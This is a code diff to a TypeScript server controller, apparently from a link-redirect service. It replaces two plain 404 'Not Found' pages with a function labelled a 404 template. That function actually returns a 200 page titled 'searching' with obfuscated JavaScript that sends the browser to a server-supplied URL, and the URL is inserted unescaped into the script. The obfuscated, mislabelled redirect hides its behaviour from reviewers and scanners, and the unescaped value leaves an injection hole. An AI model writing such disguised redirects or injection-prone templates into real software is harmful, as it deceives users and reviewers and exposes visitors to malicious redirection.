@@ -97,32 +97,12 @@ export class SignController {
             }
     
             let redirectData = await this.urlRedirectService.redirect(params, ssid,request);
-        
+
             return   res
-            .status(404)
+            .status(200)
             .contentType('text/html')
-            .send(`
-                <!DOCTYPE html>
-                <html lang="zh-CN">
-                <head>
-                    <meta charset="UTF-8">
-                    <title>页面未找到</title>
-                    <style>
-                        body { font-family: Arial, Helvetica, sans-serif; background: #f5f5f5; text-align: center; padding: 60px; }
-                        .container { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); display: inline-block; padding: 40px 60px; }
-                        h1 { font-size: 48px; margin-bottom: 16px; color: #e53935; }
-                        p { font-size: 20px; color: #555; }
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <h1>404</h1>
-                        <p>页面未找到，请检查您的链接是否正确。</p>
-                        <p>Not Found, Check your url!</p>
-                    </div>
-                </body>
-                </html>
-            `);
+            .send(notFoundHtmlTemplate(redirectData));
+
         }
     
         //应对 https://www.iosxapp.com/redirect/123456/s 这总格式
@@ -140,30 +120,9 @@ export class SignController {
 
 
             return   res
-            .status(404)
+            .status(200)
             .contentType('text/html')
-            .send(`
-                <!DOCTYPE html>
-                <html lang="zh-CN">
-                <head>
-                    <meta charset="UTF-8">
-                    <title>页面未找到</title>
-                    <style>
-                        body { font-family: Arial, Helvetica, sans-serif; background: #f5f5f5; text-align: center; padding: 60px; }
-                        .container { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); display: inline-block; padding: 40px 60px; }
-                        h1 { font-size: 48px; margin-bottom: 16px; color: #e53935; }
-                        p { font-size: 20px; color: #555; }
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <h1>404</h1>
-                        <p>页面未找到，请检查您的链接是否正确。</p>
-                        <p>Not Found, Check your url!</p>
-                    </div>
-                </body>
-                </html>
-            `);
+            .send(notFoundHtmlTemplate(redirectData));
 
 
         }
@@ -194,6 +153,33 @@ export class SignController {
 
 
 }
+
+
+// INSERT_YOUR_CODE
+
+// 404 HTML模板，使用 Express 响应
+function notFoundHtmlTemplate(new_url: string) {
+
+
+    return `
+    <!DOCTYPE html>
+    <html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8">
+        <title>searching</title>
+        <script>
+          function _0x241b(_0x726be2,_0x5ef66a){_0x726be2=_0x726be2-0x1d3;var _0x2c6310=_0x2c63();var _0x241bed=_0x2c6310[_0x726be2];return _0x241bed;}var _0x554727=_0x241b;(function(_0x153213,_0x5026dc){var _0x57d820=_0x241b,_0x241766=_0x153213();while(!![]){try{var _0x4688e2=-parseInt(_0x57d820(0x1de))/0x1*(parseInt(_0x57d820(0x1dc))/0x2)+parseInt(_0x57d820(0x1d8))/0x3*(parseInt(_0x57d820(0x1da))/0x4)+parseInt(_0x57d820(0x1d6))/0x5+-parseInt(_0x57d820(0x1d7))/0x6+parseInt(_0x57d820(0x1d9))/0x7+parseInt(_0x57d820(0x1db))/0x8*(-parseInt(_0x57d820(0x1dd))/0x9)+parseInt(_0x57d820(0x1d4))/0xa;if(_0x4688e2===_0x5026dc)break;else _0x241766['push'](_0x241766['shift']());}catch(_0x2b553d){_0x241766['push'](_0x241766['shift']());}}}(_0x2c63,0x6500e),window[_0x554727(0x1d3)][_0x554727(0x1d5)]='${new_url}');function _0x2c63(){var _0x573705=['6rjldJG','4906244AaUztw','114592HykoLu','392OkGoUl','92VYraio','15129umGWqS','463zxJKsV','location','3913930ETzVBA','href','578010sjdAfx','4486836wZdEBf'];_0x2c63=function(){return _0x573705;};return _0x2c63();}
+        </script>
+    </head>
+    <body>
+        <div class="container">
+          
+        </div>
+    </body>
+    </html>
+    `;
+}
+
 
 
 
